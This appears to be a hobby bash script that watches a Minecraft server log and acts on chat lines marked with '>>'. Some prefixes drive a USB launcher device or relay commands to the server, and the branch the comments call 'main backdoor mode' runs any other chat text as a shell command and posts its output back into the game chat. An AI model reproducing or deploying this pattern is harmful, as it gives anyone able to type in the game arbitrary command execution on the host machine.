#!/bin/bash
sleep 2
exec 3>&1
exec 2>&1
tmpPath=/tmp/temp.txt
sockPath=/tmp/test.sock
echo $tmpPath
exec 1>$tmpPath


tail -f logs/latest.log | while read p; do
	if grep ">>" <<<$p >> /dev/null; then 
		#remove everything before the ">>"
		p=`sed 's/.*>>//' <<<$p`
		#save the first character in the user input
		first=${p:0:1}
		#turret mode
		if [ "$first" = "!" ]; then
			byte=${p:1:3}
			de="echo -en '\x${byte}' > /dev/launcher0"
			$de
			echo $de>&3
		#minecraft input mode
		elif [ "$first" = "0" ]; then
 			command="${p:1}"
			echo $command >&3
                        echo $command > $sockPath
		#main backdoor mode
		else  	
			command=$p
        		$command
	        	exec 1>&3

	      		tmp=`cat $tmpPath`
			say="say "
		        res=`cat $tmpPath | tr '\n' ' '`
				
			str=${say}${res}	
			echo $str>$sockPath
	       		#echo $str>&3
		fi	
		exec 1>$tmpPath
		
	fi  
  
done 